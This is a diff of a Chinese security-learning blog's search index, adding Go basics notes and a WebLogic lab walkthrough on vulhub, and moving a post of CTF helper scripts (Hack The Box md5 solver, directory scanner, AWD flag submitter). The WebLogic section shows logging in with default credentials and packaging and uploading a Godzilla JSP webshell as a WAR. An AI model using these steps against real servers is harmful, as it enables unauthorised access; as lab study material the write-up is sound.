@@ -472,8 +472,8 @@
     <url>/2022/03/21/Go/</url>
     <content><![CDATA[<p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。</p>
 <h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>学习go写脚本和 免杀（其他大佬的有些免杀也是用go写的，效果不错，也算是为了能看懂代码吧）</p>
-<p>感觉go结构和java  很像，但go有指针。</p>
-<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件exe</p>
+<p>go 没有类，有结构体，有指针，（主要是利用函数）。</p>
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go build xxx.go</span><br></pre></td></tr></table></figure>
 
 <p>结构</p>
@@ -483,10 +483,47 @@
 
 
 
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main  定义了包名</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  使用 fmt 包</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;菜鸟教程&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello go&quot;</span> + <span class="string">&quot;good&quot;</span>,<span class="string">&quot;good&quot;</span>)</span><br><span class="line"></span><br><span class="line">	test()</span><br><span class="line">	<span class="keyword">var</span> age <span class="keyword">int</span></span><br><span class="line">	age = <span class="number">11</span></span><br><span class="line">	fmt.Println(age)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main  定义了包名</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  调用 fmt 包</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;菜鸟教程&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello go&quot;</span> + <span class="string">&quot;good&quot;</span>,<span class="string">&quot;good&quot;</span>)</span><br><span class="line"></span><br><span class="line">	test()</span><br><span class="line">	<span class="keyword">var</span> age <span class="keyword">int</span></span><br><span class="line">	age = <span class="number">11</span></span><br><span class="line">	fmt.Println(age)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
+
+
+<h3 id="golang包"><a href="#golang包" class="headerlink" title="golang包"></a>golang包</h3><p>包用来区分命名空间，一般一个文件夹一个包，package “name” 声明包，文件夹与包名一样，一个文件夹下只有一个包。</p>
+<ul>
+<li>创建包</li>
+</ul>
+<p>例如src 文件夹下新建test文件 ，新建 test1.go</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xxxx</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>导入包</li>
+</ul>
+<p>利用go module（1.11开始使用） 管理包依赖</p>
+<ol>
+<li>初始化模块</li>
+</ol>
+<p>go mod init  &lt;项目名称&gt;</p>
+<ol start="2">
+<li>依赖关系处理，通过go.mod文件</li>
+</ol>
+<p>go mod tidy</p>
+<ol start="3">
+<li>将依赖包复制到项目到 xxx目录</li>
+</ol>
+<p>go mod  xxx</p>
+<p>如果包被屏蔽(墙),可以使用这个命令，随后使用go build -mod=xxxx编译</p>
+<ol start="4">
+<li>显示依赖关系</li>
+</ol>
+<p>go list -m all</p>
+<p>go list -m -json all (详细显示)</p>
+<ol start="5">
+<li>下载依赖</li>
+</ol>
+<p>go  mod  download [path@version]</p>
 <p>学习：<a href="https://www.runoob.com/go">https://www.runoob.com/go</a></p>
 <p><a href="https://github.com/Leslie1sMe/golang">Leslie1sMe/golang: Golang的实战项目，学习笔记，代码例程汇总。 (github.com)</a></p>
 ]]></content>
@@ -836,9 +873,47 @@
   <entry>
     <title>middleware</title>
     <url>/2022/03/20/middleware-java/</url>
-    <content><![CDATA[<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><span id="more"></span>
+    <content><![CDATA[<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>默认端口：<code>7001</code></p>
+<p>部分历史漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 弱口令&#x2F;任意文件读取+后台war包&#x2F;任意文件上传getshell</span><br><span class="line">2. CVE-2017-20271</span><br><span class="line">3. CVE-2018-2628</span><br><span class="line">4. CVE-2019-2725</span><br><span class="line">5. CVE-2020-2555</span><br><span class="line">6. CVE-2021-2394</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h1 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h1><h1 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h1>]]></content>
+<p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240">中间件</a>，WebLogic是用于<a href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971">开发</a>、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731">数据库应用</a>的Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8">应用服务器</a>。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p>
+<p>weblogic是java EE的应用服务器（application server），包括ejb ,jsp,servlet,jms等等，全能型的。是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他如JAVA编辑等工具，是一个综合的开发及运行环境。(收费)</p>
+<span id="more"></span>
+
+<p><img src="/2022/03/20/middleware-java/image-20220323214802592.png" alt="image-20220323214802592"></p>
+<p>以下环境为vulhub靶场环境</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="弱口令-上传war包"><a href="#弱口令-上传war包" class="headerlink" title="弱口令+上传war包"></a>弱口令+上传war包</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>weblogic搭建完后没有修改后台登陆密码</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>启动环境</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324002901248.png" alt="image-20220324002901248"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.165:7001&#x2F;console       访问后台</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/20/middleware-java/image-20220324010752442.png" alt="image-20220324010752442"></p>
+<p>weblogic/Oracle@123登陆后台（bp爆破，密码错五次就会禁止认证）</p>
+<p>下面要准备war包上传</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324011153236.png" alt="image-20220324011153236"></p>
+<p>点上传文件</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324011308204.png" alt="image-20220324011308204"></p>
+<p>将jsp马（哥斯拉生成jsp）打包成war包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war 1.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/20/middleware-java/image-20220324011818173.png" alt="image-20220324011818173"></p>
+<p>然后一直下一步，完成</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324011923927.png" alt="image-20220324011923927"></p>
+<p>成功上传</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324012109060.png" alt="image-20220324012109060"></p>
+<p>访问：<a href="http://192.168.119.165:7001/shell/1.jsp">http://192.168.119.165:7001/shell/1.jsp</a> ，shell连接</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324014607221.png" alt="image-20220324014607221"></p>
+<p><img src="/2022/03/20/middleware-java/image-20220324014649096.png" alt="image-20220324014649096"></p>
+<p>参考：<a href="https://xz.aliyun.com/t/9932#toc-4">weblogic漏洞大杂烩 - 先知社区 (aliyun.com)</a></p>
+<p>工具：(<a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a>)</p>
+<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><p>jboss/jboss +war上传</p>
+<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h1 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h1><h1 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h1>]]></content>
       <categories>
         <category>中间件</category>
       </categories>
@@ -992,58 +1067,6 @@
       </tags>
   </entry>
   <entry>
-    <title>python-study</title>
-    <url>/2021/01/10/python-study/</url>
-    <content><![CDATA[<h2 id="0x01-MD5-encrypt-this-string"><a href="#0x01-MD5-encrypt-this-string" class="headerlink" title="0x01 MD5 encrypt this string"></a>0x01 MD5 encrypt this string</h2><p><img src="/2021/01/10/python-study/1.png" alt="image-20210129112157855"></p>
-<p>提取字符串，进行md5加密，并提交。我还是太慢了，学学脚本。网络有点卡多提交几次</p>
-<p>from hack the box web1</p>
-<p>自己结合网上的学习了两种方法，re.search和re.findall，个人感觉还是比较喜欢第二种方法，感觉法二挺方便的</p>
-<span id="more"></span>
-
-<ul>
-<li>法一</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re              <span class="comment">#字符串匹配</span></span><br><span class="line"></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=1nd51s259e9epagvhkgolgm5h7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588&quot;</span>&#125;</span><br><span class="line">url1 = <span class="string">&quot;http://159.65.87.50:32588/&quot;</span></span><br><span class="line">req1 = requests.get(url=url1,headers=head)</span><br><span class="line">str1= re.search(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;(.)*&lt;/h3&gt;&quot;</span>,req1.text)</span><br><span class="line">str2=str1.group(<span class="number">0</span>).replace(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/h3&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print (str2)</span></span><br><span class="line">h1=hashlib.md5()</span><br><span class="line">h1.update(str2.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">md5 =h1.hexdigest()</span><br><span class="line"><span class="comment">#print(md5)</span></span><br><span class="line">postdata=<span class="string">&quot;hash=&quot;</span>+md5</span><br><span class="line"></span><br><span class="line">req2=requests.post(data=postdata,url=url1,headers=head)</span><br><span class="line"><span class="built_in">print</span>(req2.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>法二</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-   </span></span><br><span class="line"><span class="comment"># hack the box web1 re.findall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_str</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    md=hashlib.md5();</span><br><span class="line">    md.update(<span class="built_in">str</span>.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://138.68.182.108:31255/&quot;</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=3brhsrsfuq7k869bg9s7bae6u4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://138.68.182.108:31255&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req1 = requests.get(url,headers=head)</span><br><span class="line"><span class="built_in">str</span> = re.findall(<span class="string">r&#x27;&lt;h3 align=.*&gt;(.*?)&lt;/h3&gt;&#x27;</span>,req1.text,re.S)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(str)</span></span><br><span class="line">mdstr=md5_str(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#print(mdstr)</span></span><br><span class="line">req2=requests.post(url,headers=head,data=<span class="string">&quot;hash=&quot;</span>+mdstr)</span><br><span class="line"><span class="comment">#print(req2.text)</span></span><br><span class="line">flag=<span class="string">&quot;HTB&#123;&quot;</span>+re.findall(<span class="string">&#x27;HTB\&#123;(.*?)\&#125;&#x27;</span>,req2.text,re.S)[<span class="number">0</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/10/python-study/1.1.png" alt="1.1"></p>
-<h2 id="0x02-scan-dir目录扫描"><a href="#0x02-scan-dir目录扫描" class="headerlink" title="0x02 scan_dir目录扫描"></a>0x02 scan_dir目录扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&#x27;</span>&#125;</span><br><span class="line">url = sys.argv[<span class="number">1</span>]   </span><br><span class="line">zidian = sys.argv[<span class="number">2</span>]</span><br><span class="line">result = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(zidian,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line.strip()</span><br><span class="line">        r =requests.get(url+line,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;\n   exist&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(result,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">                f1.write(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;    exist\n&quot;</span>)    //写入result.txt</span><br><span class="line">        <span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&quot;url:&quot;</span>+r.url +<span class="string">&quot;\n   false&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>python  scan_dir.py  <a href="http://www.shmilying.top/">http://www.shmilying.top/</a>  F:\pycharm\python-study\zidian.txt   F:\pycharm\python-study\result.txt</p>
-<p>result:</p>
-<p><img src="/2021/01/10/python-study/2.0.png" alt="2.0"></p>
-<p><img src="/2021/01/10/python-study/2.1.png" alt="2.1"></p>
-<h2 id="0x03-file-open-r-w-a"><a href="#0x03-file-open-r-w-a" class="headerlink" title="0x03 file_open_r/w/a"></a>0x03 file_open_r/w/a</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">***read***</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> f():</span><br><span class="line">        <span class="built_in">print</span>(a.strip())       <span class="comment">#最实用,方便，而且效果和下面的一样。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="built_in">print</span>(line.strip())     <span class="comment">#比较方便</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():  <span class="comment">#读取全部  == for line in f：</span></span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    <span class="built_in">print</span>(line.strip())  <span class="comment">#去除空行</span></span><br><span class="line">f.close()                 <span class="comment">#记得关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line1 = f.readline()        <span class="comment">#读一行</span></span><br><span class="line"><span class="built_in">print</span>(line1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line2 = f.read(<span class="number">1</span>)           <span class="comment">#读字节</span></span><br><span class="line"><span class="built_in">print</span>(line2)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***write***</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)          <span class="comment">#open(&quot;zidian.txt&quot;,&quot;a&quot;) 在末尾追加,不影响原来的</span></span><br><span class="line">f.write(<span class="string">&#x27;\nxxxxx&#x27;</span>)                  <span class="comment">#open(&quot;zidian.txt&quot;,&quot;w&quot;) w:写入内容会覆盖原有内容</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f2.readlines():</span><br><span class="line">    <span class="built_in">print</span>(line.strip())</span><br><span class="line">f2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>总结：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;c:\filename&quot;</span>,<span class="string">&quot;mode&quot;</span>)   //mode:r/w/a</span><br><span class="line">xxxxxxx</span><br><span class="line">xxxxxxx</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04awd-sendflag"><a href="#0x04awd-sendflag" class="headerlink" title="0x04awd_sendflag"></a>0x04awd_sendflag</h2><p>学习的大佬脚本，批量sendflag。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>-<span class="title">flag</span>(<span class="params">flag</span>):</span>      //自定义函数</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://xx.xxx.xxx.xx:8080/api/v1/challenges/attempt&quot;</span></span><br><span class="line">    <span class="comment">#data=&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&quot;+flag+&quot;&quot;&#125;</span></span><br><span class="line">    data=<span class="string">&#x27;&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&#x27;</span>+flag+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;CSRF-Token&quot;</span>:<span class="string">&quot;e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;2deefa03-cda6-41fc-be25-a986067c7048&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;jnr3quolg5o2ohlifbdld6bku5&quot;</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    <span class="built_in">print</span>(req.text)        //result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagtxt</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;web1-flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            <span class="built_in">print</span>(a.strip())</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            result-flag(a.strip())</span><br><span class="line">            </span><br><span class="line">flagtxt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x05-生成以指定字符为开头的md5值"><a href="#0x05-生成以指定字符为开头的md5值" class="headerlink" title="0x05 生成以指定字符为开头的md5值"></a>0x05 生成以指定字符为开头的md5值</h2><ul>
-<li>百度的</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 脚本功能：生成以指定字符为开头的md5值（x位数字）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">chars</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(chars.encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">11111111</span>,<span class="number">99999999</span>))  <span class="comment">#爆破范围</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = <span class="string">&quot;66666&quot;</span>  <span class="comment">#md5指定前几位</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs = generate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Test %s &quot;</span> % strs)</span><br><span class="line">        <span class="keyword">if</span> encryption(strs).startswith(start):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;yes!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+] %s &quot;</span> % strs + <span class="string">&quot;%s &quot;</span> % encryption(strs))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;no!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;完成！&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>结果如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yes!</span><br><span class="line">[+] 43650254 66666b9c81d0d15f983ad8963908ce10 </span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>白帽python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlmap</title>
     <url>/2021/02/04/sqlmap/</url>
     <content><![CDATA[<h2 id="sqlmap的常见使用方式"><a href="#sqlmap的常见使用方式" class="headerlink" title="sqlmap的常见使用方式"></a>sqlmap的常见使用方式</h2><blockquote>
@@ -1104,6 +1127,58 @@
       </categories>
       <tags>
         <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python-study</title>
+    <url>/2021/01/10/python-study/</url>
+    <content><![CDATA[<h2 id="0x01-MD5-encrypt-this-string"><a href="#0x01-MD5-encrypt-this-string" class="headerlink" title="0x01 MD5 encrypt this string"></a>0x01 MD5 encrypt this string</h2><p><img src="/2021/01/10/python-study/1.png" alt="image-20210129112157855"></p>
+<p>提取字符串，进行md5加密，并提交。我还是太慢了，学学脚本。网络有点卡多提交几次</p>
+<p>from hack the box web1</p>
+<p>自己结合网上的学习了两种方法，re.search和re.findall，个人感觉还是比较喜欢第二种方法，感觉法二挺方便的</p>
+<span id="more"></span>
+
+<ul>
+<li>法一</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re              <span class="comment">#字符串匹配</span></span><br><span class="line"></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=1nd51s259e9epagvhkgolgm5h7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://159.65.87.50:32588&quot;</span>&#125;</span><br><span class="line">url1 = <span class="string">&quot;http://159.65.87.50:32588/&quot;</span></span><br><span class="line">req1 = requests.get(url=url1,headers=head)</span><br><span class="line">str1= re.search(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;(.)*&lt;/h3&gt;&quot;</span>,req1.text)</span><br><span class="line">str2=str1.group(<span class="number">0</span>).replace(<span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/h3&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print (str2)</span></span><br><span class="line">h1=hashlib.md5()</span><br><span class="line">h1.update(str2.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">md5 =h1.hexdigest()</span><br><span class="line"><span class="comment">#print(md5)</span></span><br><span class="line">postdata=<span class="string">&quot;hash=&quot;</span>+md5</span><br><span class="line"></span><br><span class="line">req2=requests.post(data=postdata,url=url1,headers=head)</span><br><span class="line"><span 